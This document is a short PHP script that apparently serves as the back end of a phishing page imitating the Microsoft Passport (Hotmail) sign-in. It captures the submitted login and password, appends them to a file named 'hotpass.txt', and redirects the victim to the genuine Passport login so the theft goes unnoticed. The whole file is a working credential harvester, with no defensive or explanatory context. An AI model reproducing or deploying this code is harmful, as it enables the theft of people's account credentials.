<?PHP
//echo $_POST['login']."<BR>";
//echo $_POST['passwd'];

$fp = fopen("hotpass.txt","a+");
fputs($fp,$_POST['login']." \ ".$_POST['passwd']."\r\n");
fclose($fp);

header("location:https://login.passport.com/ppsecure/post.srf");



?>

